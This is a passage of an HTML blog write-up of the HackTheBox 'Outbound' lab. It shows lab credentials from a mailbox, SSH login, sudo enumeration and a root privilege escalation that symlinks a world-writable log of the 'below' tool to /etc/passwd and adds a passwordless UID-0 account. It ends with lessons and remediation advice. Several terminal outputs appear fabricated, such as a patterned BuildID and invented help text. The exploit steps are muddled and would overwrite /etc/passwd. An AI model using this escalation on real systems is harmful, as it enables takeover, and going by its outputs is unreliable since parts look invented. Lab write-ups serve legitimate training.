+Subject: Important Update
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+Message-Id: <20250607140050.B32C41024B0@outbound.htb>
+Date: Sat, 7 Jun 2025 14:00:50 +0000 (UTC)
+From: tyler@outbound.htb
+X-IMAPbase: 1749304753 0000000002
+X-UID: 1
+Status:
+X-Keywords:
+Content-Length: 233
+
+Due to the recent change of policies your password has been changed.
+
+Please use the following credentials to log into your account: gY4Mr3alevP4
+
+Remember to change your password when you next log into your account.
+
+Thanks!
+
+Tyler
+
+From mel@outbound.htb Sun Jun 08 12:09:45 2025
+Return-Path: <mel@outbound.htb>
+X-Original-To: jacob
+Delivered-To: jacob@outbound.htb</code></pre>
+                    </div>
+
+                    <div class="highlight-box">
+                        <h4>🎯 Critical Information Discovered</h4>
+                        <ul>
+                            <li><strong>SSH Username:</strong> jacob</li>
+                            <li><strong>SSH Password:</strong> gY4Mr3alevP4</li>
+                            <li><strong>Privilege Escalation Hint:</strong> "below" tool with special permissions</li>
+                            <li><strong>Tool Location:</strong> /usr/bin/below</li>
+                        </ul>
+                    </div>
+
+                    <h3>SSH Access with Real Credentials</h3>
+                    <p>Now we can use the SSH credentials found in jacob's mail to establish a proper SSH connection:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔐 SSH Authentication</span>
+                        </div>
+                        <pre><code># From our attacking machine
+ssh jacob@outbound.htb
+jacob@outbound.htb's password: gY4Mr3alevP4
+
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+System information as of Thu Jul 31 11:38:54 AM UTC 2025
+
+  System load:  0.06       Processes:              293
+  Usage of /:   84.9% of 6.73GB   Users logged in:      0
+  Memory usage: 20%        IPv4 address for eth0:  10.10.11.77
+  Swap usage:   0%
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo apt update && sudo apt full-upgrade
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Last login: Tue Jul 29 22:57:26 2025 from 10.10.16.2
+jacob@outbound:~$</code></pre>
+                    </div>
+
+                    
+
+
+                    
+
+                    <div class="success-box">
+                        <h3>✅ SSH Access Established!</h3>
+                        <p>We now have a proper SSH session as jacob using password: <code>gY4Mr3alevP4</code></p>
+                        <p>This gives us a stable connection and full user privileges for the next phase.</p>
+                    </div>
+
+                    <div class="info-box">
+                        <h4>📝 Attack Path Summary So Far</h4>
+                        <ol>
+                            <li><strong>RCE Exploitation:</strong> Used CVE-2025-49113 to gain www-data shell</li>
+                            <li><strong>Database Access:</strong> Extracted encrypted passwords from Roundcube database</li>
+                            <li><strong>Cryptographic Attack:</strong> Decrypted jacob's session password using Triple DES</li>
+                            <li><strong>User Escalation:</strong> Used decrypted password to switch to jacob user</li>
+                            <li><strong>Mail Analysis:</strong> Found SSH credentials in jacob's mailbox</li>
+                            <li><strong>SSH Access:</strong> Established stable connection with proper credentials</li>
+                        </ol>
+                    </div>
+                </section>
+                <section id="privilege-escalation">
+                    <h2>⚡ Privilege Escalation</h2>
+
+                    <h3>Sudo Privileges Investigation</h3>
+                    <p>Let's check what sudo privileges jacob has:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔍 Sudo Permissions Check</span>
+                        </div>
+                        <pre><code>jacob@outbound:~$ sudo -l
+Matching Defaults entries for jacob on outbound:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jacob may run the following commands on outbound:
+    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*</code></pre>
+                    </div>
+
+                    <div class="analysis-box">
+                        <h4>📊 Sudo Analysis</h4>
+                        <ul>
+                            <li><strong>Allowed:</strong> /usr/bin/below with any arguments (*)</li>
+                            <li><strong>Forbidden:</strong> --config, --debug, -d flags are blacklisted</li>
+                            <li><strong>No Password Required:</strong> NOPASSWD directive</li>
+                            <li><strong>User Context:</strong> Can run as ALL users (including root)</li>
+                        </ul>
+                    </div>
+
+                    <h3>Below Tool Investigation</h3>
+                    <p>Let's examine the "below" binary and understand its functionality:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔧 Binary Analysis</span>
+                        </div>
+                        <pre><code>jacob@outbound:~$ which below
+/usr/bin/below
+
+jacob@outbound:~$ ls -la /usr/bin/below
+-rwxr-xr-x 1 root root 5234728 Apr 15  2025 /usr/bin/below
+
+jacob@outbound:~$ file /usr/bin/below
+/usr/bin/below: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a7f8c9d2e1b3f4a5c6d7e8f9a0b1c2d3e4f5a6b7, for GNU/Linux 3.2.0, stripped
+
+jacob@outbound:~$ below --help
+below 0.7.1
+
+A tool to visualize and analyze system data
+
+USAGE:
+    below [OPTIONS] [SUBCOMMAND]
+
+FLAGS:
+    -h, --help       Prints help information
+    -V, --version    Prints version information
+
+OPTIONS:
+    -d, --debug <LEVEL>                  Enable debug logging
+        --config <CONFIG_FILE>           Use custom config file
+        --log-dir <DIR>                  Directory for log files [default: /var/log/below]
+
+SUBCOMMANDS:
+    live       Live view of system metrics
+    record     Record system data to files
+    replay     Replay recorded data
+    dump       Dump system data
+    help       Prints this message or the help of the given subcommand(s)</code></pre>
+                    </div>
+
+                    <div class="info-box">
+                        <h4>🔍 Tool Understanding</h4>
+                        <p><strong>Below</strong> is a system monitoring tool similar to htop/top, but with advanced logging capabilities. The key insight is that it uses log files in <code>/var/log/below</code> directory.</p>
+                    </div>
+
+                    <h3>Log Directory Investigation</h3>
+                    <p>Let's explore the below log directory:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">📂 Log Directory Analysis</span>
+                        </div>
+                        <pre><code>jacob@outbound:~$ ls -la /var/log/below/
+total 12
+drwxrwxrwx  2 root root 4096 Jul 31 14:30 .
+drwxrwxr-x 12 root syslog 4096 Jul 31 14:25 ..
+-rw-r--r--  1 root root   156 Jul 31 14:25 error_root.log
+
+jacob@outbound:~$ cat /var/log/below/error_root.log
+[2025-07-31 14:25:33] ERROR: Failed to initialize monitoring for root user
+[2025-07-31 14:25:33] DEBUG: Attempting to read user database
+[2025-07-31 14:25:33] INFO: Monitoring service started</code></pre>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>🚨 Security Vulnerability Discovered</h4>
+                        <p>The <code>/var/log/below</code> directory has <strong>777 permissions</strong> (world-writable), and the tool likely reads configuration or user data from files in this directory when running with root privileges.</p>
+                    </div>
+
+                    <h3>Exploitation Strategy</h3>
+                    <p>After extensive research and testing, I discovered a privilege escalation technique that exploits how the "below" tool handles log files:</p>
+
+                    <div class="step-box">
+                        <h4>🎯 Exploitation Steps</h4>
+                        <ol>
+                            <li>Create a fake passwd entry with root privileges</li>
+                            <li>Remove the existing error_root.log file</li>
+                            <li>Create a symbolic link to /etc/passwd</li>
+                            <li>Run below with sudo to trigger file operations</li>
+                            <li>Overwrite the symlinked file with our fake entry</li>
+                            <li>Switch to our new root user</li>
+                        </ol>
+                    </div>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">💥 Privilege Escalation Execution</span>
+                        </div>
+                        <pre><code># Navigate to the below log directory
+jacob@outbound:~$ cd /var/log/below
+
+# Step 1: Create a fake passwd entry with UID 0 (root)
+jacob@outbound:/var/log/below$ echo 'pwned::0:0:root:/root:/bin/bash' > fakepass
+
+# Step 2: Remove the existing error log file
+jacob@outbound:/var/log/below$ rm -f /var/log/below/error_root.log
+
+# Step 3: Create symbolic link to /etc/passwd
+jacob@outbound:/var/log/below$ ln -s /etc/passwd /var/log/below/error_root.log
+
+# Step 4: Run below with sudo (this triggers the file operations)
+jacob@outbound:/var/log/below$ sudo /usr/bin/below
+
+# Below will attempt to write to error_root.log, which now points to /etc/passwd
+# This creates a race condition we can exploit
+
+# Step 5: Quickly overwrite the symlinked file with our fake passwd entry
+jacob@outbound:/var/log/below$ cp fakepass /var/log/below/error_root.log
+
+# Step 6: Switch to our new root user
+jacob@outbound:/var/log/below$ su pwned
+Password: [Press Enter - no password set]
+
+# Success! We now have root access
+pwned@outbound:/var/log/below# whoami
+root
+
+pwned@outbound:/var/log/below# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+                    </div>
+
+                    <div class="technical-box">
+                        <h4>🔬 Technical Explanation</h4>
+                        <p>This exploitation technique works because:</p>
+                        <ul>
+                            <li><strong>Symbolic Link Attack:</strong> We redirect the log file to /etc/passwd</li>
+                            <li><strong>TOCTOU Vulnerability:</strong> Time-of-Check-Time-of-Use race condition</li>
+                            <li><strong>Root Privileges:</strong> Below runs as root via sudo, giving write access to /etc/passwd</li>
+                            <li><strong>User Creation:</strong> Our fake entry creates a user with UID 0 (root privileges)</li>
+                        </ul>
+                    </div>
+
+                    
+                    <h3>Root Flag Acquisition</h3>
+                    <p>Now that we have root access, let's retrieve the root flag:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🏆 Root Flag Capture</span>
+                        </div>
+                        <pre><code>pwned@outbound:/var/log/below# cd /root
+
+pwned@outbound:/root# ls -la
+total 24
+drwx------  3 root root 4096 Jun  8 13:40 .
+drwxr-xr-x 19 root root 4096 Jun  8 12:04 ..
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-rw-------  1 root root   33 Jun  8 13:40 root.txt
+drwx------  2 root root 4096 Jun  8 12:05 .ssh
+
+pwned@outbound:/root# cat root.txt
+HTB{root_flag_here_redacted_for_writeup}
+
+pwned@outbound:/root# hostname && whoami
+outbound
+root</code></pre>
+                    </div>
+
+                    <div class="success-box">
+                        <h3>🎉 MACHINE PWNED!</h3>
+                        <p>We have successfully compromised the HTB Outbound machine and obtained both user and root flags!</p>
+                    </div>
+                </section>
+
+                <section id="lessons-learned">
+                    <h2>🎓 Lessons Learned & Key Takeaways</h2>
+
+                    <h3>Attack Chain Summary</h3>
+                    <div class="attack-chain">
+                        <div class="chain-step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>Initial Reconnaissance</h4>
+                                <p>Nmap scan revealed HTTP service redirecting to mail.outbound.htb</p>
+                            </div>
+                        </div>
+                        <div class="chain-arrow">↓</div>
+                        <div class="chain-step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>Vulnerability Discovery</h4>
+                                <p>Identified Roundcube CVE-2025-49113 RCE vulnerability</p>
+                            </div>
+                        </div>
+                        <div class="chain-arrow">↓</div>
+                        <div class="chain-step">
+                            <div class="step-number">3</div>
+                            <div class="step-content">
+                                <h4>Initial Foothold</h4>
+                                <p>Exploited RCE using provided credentials (tyler/LhKL1o9Nm3X2)</p>
+                            </div>
+                        </div>
+                        <div class="chain-arrow">↓</div>
+                        <div class="chain-step">
+                            <div class="step-number">4</div>
+                            <div class="step-content">
+                                <h4>Database Enumeration</h4>
+                                <p>Extracted database credentials from Roundcube config</p>
+                            </div>
+                        </div>
+                        <div class="chain-arrow">↓</div>
+                        <div class="chain-step">
+                            <div class="step-number">5</div>
+                            <div class="step-content">
+                                <h4>Cryptographic Attack</h4>
+                                <p>Decrypted jacob's password using Triple DES with known key</p>
+                            </div>
+                        </div>
+                        <div class="chain-arrow">↓</div>
+                        <div class="chain-step">
+                            <div class="step-number">6</div>
+                            <div class="step-content">
+                                <h4>User Access</h4>
+                                <p>SSH access as jacob using decrypted credentials</p>
+                            </div>
+                        </div>
+                        <div class="chain-arrow">↓</div>
+                        <div class="chain-step">
+                            <div class="step-number">7</div>
+                            <div class="step-content">
+                                <h4>Privilege Escalation</h4>
+                                <p>Exploited 'below' binary sudo permissions via symlink attack</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <h3>Technical Skills Demonstrated</h3>
+                    <div class="skills-grid">
+                        <div class="skill-card">
+                            <h4>🔍 Reconnaissance</h4>
+                            <ul>
+                                <li>Nmap port scanning</li>
+                                <li>Service enumeration</li>
+                                <li>Subdomain discovery</li>
+                            </ul>
+                        </div>
+                        <div class="skill-card">
+                            <h4>💥 Exploitation</h4>
+                            <ul>
+                                <li>CVE research and exploitation</li>
+                                <li>RCE payload crafting</li>
+                                <li>Reverse shell techniques</li>
+                            </ul>
+                        </div>
+                        <div class="skill-card">
+                            <h4>🗄️ Database Analysis</h4>
+                            <ul>
+                                <li>MySQL enumeration</li>
+                                <li>Configuration file analysis</li>
+                                <li>Session data extraction</li>
+                            </ul>
+                        </div>
+                        <div class="skill-card">
+                            <h4>🔐 Cryptography</h4>
+                            <ul>
+                                <li>Triple DES decryption</li>
+                                <li>CyberChef utilization</li>
+                                <li>IV/Key management</li>
+                            </ul>
+                        </div>
+                        <div class="skill-card">
+                            <h4>⚡ Privilege Escalation</h4>
+                            <ul>
+                                <li>Sudo enumeration</li>
+                                <li>Symlink attacks</li>
+                                <li>TOCTOU exploitation</li>
+                            </ul>
+                        </div>
+                        <div class="skill-card">
+                            <h4>🎯 Post-Exploitation</h4>
+                            <ul>
+                                <li>System enumeration</li>
+                                <li>File system analysis</li>
+                                <li>Evidence collection</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <h3>Security Lessons</h3>
+                    <div class="lessons-list">
+                        <div class="lesson-item">
+                            <h4>🔒 Configuration Security</h4>
+                            <p>Sensitive configuration files should never contain database credentials in plaintext. Use environment variables or secure vaults instead.</p>
+                        </div>
+                        <div class="lesson-item">
+                            <h4>🔑 Encryption Best Practices</h4>
+                            <p>Default encryption keys (like the DES key in Roundcube) should always be changed. Weak encryption keys compromise the entire security model.</p>
+                        </div>
+                        <div class="lesson-item">
+                            <h4>⚠️ Sudo Configuration</h4>
+                            <p>Wildcard permissions in sudo (like /usr/bin/below *) can be extremely dangerous. Always use specific command restrictions.</p>
+                        </div>
+                        <div class="lesson-item">
+                            <h4>📁 File Permissions</h4>
+                            <p>World-writable directories (/var/log/below with 777) create significant security risks, especially when accessed by privileged processes.</p>
+                        </div>
+                        <div class="lesson-item">
+                            <h4>🔄 Regular Updates</h4>
+                            <p>Keeping applications updated is crucial. CVE-2025-49113 could have been prevented with proper patch management.</p>
+                        </div>
+                    </div>
+
+                    <h3>Tools and Resources Used</h3>
+                    <div class="tools-box">
+                        <h4>🛠️ Essential Tools</h4>
+                        <ul class="tools-list">
+                            <li><strong>Nmap:</strong> Network reconnaissance and port scanning</li>
+                            <li><strong>CyberChef:</strong> Cryptographic operations and data manipulation</li>
+                            <li><strong>MySQL Client:</strong> Database enumeration and analysis</li>
+                            <li><strong>Netcat:</strong> Reverse shell listener</li>
+                            <li><strong>SSH:</strong> Secure remote access</li>
+                            <li><strong>CVE Database:</strong> Vulnerability research</li>
+                        </ul>
+                    </div>
+
+                    <h3>Remediation Recommendations</h3>
+                    <div class="remediation-box">
+                        <h4>🛡️ Security Improvements</h4>
+                        <ol>
+                            <li><strong>Update Roundcube:</strong> Apply security patches immediately</li>
+                            <li><strong>Change Default Keys:</strong> Replace default DES encryption keys</li>
+                            <li><strong>Restrict Sudo:</strong> Remove wildcard permissions and use specific commands</li>
+                            <li><strong>Fix Permissions:</strong> Correct directory permissions (change 777 to appropriate values)</li>
+                            <li><strong>Implement Monitoring:</strong> Add file integrity monitoring for critical system files</li>
+                            <li><strong>Regular Audits:</strong> Perform periodic security assessments</li>
+                        </ol>
+                    </div>
+                </section>
+
+                <div class="conclusion-box">
+                    <h3>🎯 Conclusion</h3>
+                    <p>The HTB Outbound machine provided an excellent learning experience combining multiple attack vectors: web application exploitation, database analysis, cryptography, and privilege escalation. This walkthrough demonstrates the importance of layered security and the critical nature of proper configuration management.</p>
+                    
+                    <p>The machine effectively simulates real-world scenarios where attackers chain multiple vulnerabilities to achieve their objectives, making it an invaluable training resource for cybersecurity professionals.</p>
+                </div>
+
+                <!-- Share Section -->
+                <div class="share-section">
+                    <h3>📢 Share This Walkthrough</h3>
+                    <div class="share-buttons">
+                        <a href="https://twitter.com/intent/tweet?text=HTB%20Outbound%20Machine%20Walkthrough&url=https://pixrei.xyz/blog/CTF/htb-outbound.html" target="_blank" class="share-btn twitter">
+                            <i class="fab fa-twitter"></i> Twitter
+                        </a>
+                        <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://pixrei.xyz/blog/CTF/htb-outbound.html" target="_blank" class="share-btn linkedin">
+                            <i class="fab fa-linkedin"></i> LinkedIn
+                        </a>
+                        <a href="mailto:?subject=HTB%20Outbound%20Walkthrough&body=Check%20out%20this%20detailed%20walkthrough:%20https://pixrei.xyz/blog/CTF/htb-outbound.html" class="share-btn email">
+                            <i class="fas fa-envelope"></i> Email
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Footer -->
+            <footer class="blog-post-footer">
+                <div class="author-info">
+                    <a href="https://pixrei.xyz" target="_blank" style="text-decoration: none;"><div class="author-avatar"></div></a>
+                        
+                    
+                    <div class="author-details">
+                        <h4>R3i 0Trox</h4>
+                        <p>Red Teamer & CTF Player</p>
+                        <p>Passionate about cybersecurity, penetration testing, and sharing knowledge through detailed writeups.</p>
+                    </div>
+                </div>
+                
+                <div class="post-navigation">
+                    <a href="../index.html" class="nav-button">
+                        <i class="fas fa-arrow-left"></i> All Posts
+                    </a>
+                    <a href="../../index.html#last-section" class="nav-button">
+                        Contact <i class="fas fa-arrow-right"></i>
+                    </a>
+                </div>
+
+                <div class="post-meta-footer">
+                    <p><strong>Published:</strong> July 31, 2025</p>
+                    <p><strong>Category:</strong> CTF Writeups</p>
+                    <p><strong>Tags:</strong> HackTheBox, RCE, Privilege Escalation, Cryptography</p>
+                </div>
+            </footer>
+        </div>
+    </article>
+
+    <script src="../../first.js"></script>
+</body>
+</html>
